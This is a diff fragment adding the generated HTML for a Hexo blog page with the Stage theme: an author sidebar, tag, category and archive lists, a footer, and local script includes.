+                </div>
+                <div class="slide slide2">
+                    <div class="bg-wrapper">
+                        <div class="bg" id="container_right">
+                            <div id="canvas_right"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <a href="/"><img class="avatar" src="/images/avatar.jpg" alt=""></a>
+    <a href="/"><h3 class="author">John Doe</h3></a>
+    <h4></h4>
+    <div class="social">
+        
+            
+              <a href="https://github.com/markyong" title="github" class="fa fa-github" target="_blank"></a>
+            
+        
+            
+              <a href="#" title="weibo" class="fa fa-weibo" target="_blank"></a>
+            
+        
+    </div>
+</div>
+    </div>
+    
+        <div class="content-aside-about">
+            <h2>
+                <a href="/about">About</a>
+            </h2>
+        </div>
+    
+    <div class="content-aside-tags">
+        <h2>
+            <a href="/tags">
+                Tags
+                <sup style="font-size: 12px">
+                    [0]
+                </sup>
+            </a>
+        </h2>
+    </div>
+    
+<aside id="categories">
+    <h2>Categories</h2>
+    
+        <p>None.</p>
+    
+</aside>
+
+    
+<aside id="acchives">
+    <h2>Archives</h2>
+    
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+    
+</aside>
+
+</div>
+
+</div>
+<nav id="pagination" class="clearfix">
+    <span class="page-number current">1</span>
+</nav>
+
+    </div>
+</div>
+<footer id="footer">
+    <div id="copyright">&copy; John Doe  2023</div>
+    <div id="theme">
+        Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a>. Theme by <a target="_blank" rel="noopener" href="https://github.com/markyong/hexo-theme-stage">Stage</a>
+    </div>
+</footer>
+<script src="/lib/js/waterrippleeffect.min.js"></script>
+<script src="/js/header-bg.main.js"></script>
+
+    <script src="/lib/js/cav.js"></script>
+    <script src="/js/avatar-bg.main.js"></script>
+
+</body>
+</html>
